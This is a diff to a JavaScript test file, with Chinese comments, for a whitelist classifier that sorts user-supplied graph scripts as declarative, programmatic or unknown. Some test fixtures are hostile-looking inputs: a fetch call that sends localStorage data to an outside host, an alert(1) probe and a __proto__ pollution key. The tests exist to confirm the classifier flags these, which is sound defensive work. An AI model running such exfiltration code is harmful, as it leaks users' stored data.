@@ -3,6 +3,7 @@
 // 3 个实例级 class field（description / name / attrs），无 static 无 constructor
 // v0.9 vs v0.8：删除 edges 字段（边不再在 class 声明）
 import { scanClass } from '../src/scanner.js'
+import { classifySource } from '../src/parser.js'
 
 let pass = 0, fail = 0
 function check(name, cond, detail) {
@@ -108,6 +109,88 @@ console.log('\n=== 区 7：不输出 constructor / static 字段 ===')
   check('scan 结果不含 properties（v0.7 残留）', !('properties' in scan), Object.keys(scan))
   check('scan 结果不含 defaults（v0.7 残留）', !('defaults' in scan), Object.keys(scan))
   check('scan 结果不含 edges（v0.8 残留）', !('edges' in scan), Object.keys(scan))
+}
+
+// ==================================================================
+console.log('\n=== 区 8：classifySource 白名单分类(ADR-008)===')
+{
+  check('纯声明式 → declarative', classifySource(`class A {
+  description = 'A'
+  name = 'A'
+  attrs = { v: 1 }
+}
+const A_1 = GraphStarter.add(A, 'A_1')
+A_1.v = 2
+A_1.edges = [
+  { target: null, description: 'x', transform: "target['v'] = source['v']" }
+]`) === 'declarative')
+
+  check('字符串含 if( / fetch( 不误伤(transform 常见)', classifySource(`class A { attrs = { s: "if (x) fetch(1)" } }
+const A_1 = GraphStarter.add(A, 'A_1')`) === 'declarative')
+
+  check('注释含 for( 不误伤', classifySource(`// for(;;) 注释
+class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')`) === 'declarative')
+
+  check('方法体 → programmatic', classifySource(`class A {
+  attrs = { v: 1 }
+  tick() { this.v = this.v + 1 }
+}
+const A_1 = GraphStarter.add(A, 'A_1')`) === 'programmatic')
+
+  check('顶层控制流 → programmatic', classifySource(`class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+for (let i = 0; i < 3; i++) A_1.v = A_1.v + 1`) === 'programmatic')
+
+  check('constructor → programmatic', classifySource(`class A {
+  attrs = { v: 1 }
+  constructor() { this.v = 2 }
+}
+const A_1 = GraphStarter.add(A, 'A_1')`) === 'programmatic')
+
+  check('顶层 fetch 调用 → unknown', classifySource(`class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+fetch('https://example.com/' + localStorage.sa_data)`) === 'unknown')
+
+  check('顶层 alert → unknown', classifySource(`class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+alert(1)`) === 'unknown')
+
+  check('模板串插值 → unknown', classifySource('class A { attrs = { v: 1 } }\nconst A_1 = GraphStarter.add(A, \'A_1\')\nA_1.v = `${1+1}`') === 'unknown')
+
+  check('__proto__ 键 → unknown', classifySource(`class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+A_1.v = { __proto__: { x: 1 } }`) === 'unknown')
+
+  check('未知 class 字段(static) → unknown', classifySource(`class A {
+  static description = 'x'
+  attrs = { v: 1 }
+}
+const A_1 = GraphStarter.add(A, 'A_1')`) === 'unknown')
+
+  check('裸引用赋值 → declarative', classifySource(`class A { attrs = { v: 1 } }
+class B { attrs = { v: 0 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+const B_1 = GraphStarter.add(B, 'B_1')
+B_1.ref = A_1`) === 'declarative')
+
+  check('quoted key 赋值 → declarative', classifySource(`class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+A_1['a b'] = 2`) === 'declarative')
+
+  check('edges = [] → declarative', classifySource(`class A { attrs = { v: 1 } }
+const A_1 = GraphStarter.add(A, 'A_1')
+A_1.edges = []`) === 'declarative')
+
+  check('数字边界(-1/1.5/1e+21/Infinity/NaN/undefined)→ declarative', classifySource(`class A { attrs = { a: -1, b: 1.5, c: 1e+21, d: Infinity, e: NaN, f: undefined } }
+const A_1 = GraphStarter.add(A, 'A_1')`) === 'declarative')
+
+  check('未闭合字符串 → unknown', classifySource("class A { attrs = { s: 'oops } }") === 'unknown')
+
+  check('import 语句 → unknown', classifySource(`import x from 'y'
+class A { attrs = { v: 1 } }`) === 'unknown')
+
+  check('空串 → declarative', classifySource('') === 'declarative')
 }
 
 console.log(`\n总计: ${pass} 通过, ${fail} 失败`)
